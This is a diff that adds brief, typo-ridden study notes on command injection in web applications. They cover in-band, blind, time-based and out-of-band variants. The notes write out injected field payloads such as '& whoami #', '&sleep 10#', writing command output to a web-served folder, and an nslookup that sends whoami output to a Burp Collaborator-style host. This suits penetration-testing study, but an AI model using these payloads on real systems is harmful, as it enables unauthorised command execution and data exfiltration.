@@ -1,0 +1,25 @@
+Command Injection
+Attacker can execute commands on the host operating system via vulnerable web application.
+
+1. In-Band cmd injetion : Reflects results
+2. Blind cmd injection : Does not returen
+
+Where to check :
+1) Where website is checking for data from backend in any feild
+in request :  Productid=1& whoami #
+
+2) In feedbackfrom or comment secection :
+Here it maybe out of band so try timebase 
+name=test&email=email &sleep 10# &subject=abc
+
+3)  Bliend cmd injection method :
+  Find some img or life storeble path like \var\www\image\   ...(gussinfg from url http://abc.com/images)
+  name=test&email=email & whoami > \var\www\image\output.txt #
+ Acess path http://abc.com/images/output.tct  to see output
+
+4) Blind cmd injection method :
+  &nslookup burp.colabrorator.com #
+  &nslookup 'whoami' .burp.colabrorator.com #
+  
+
+
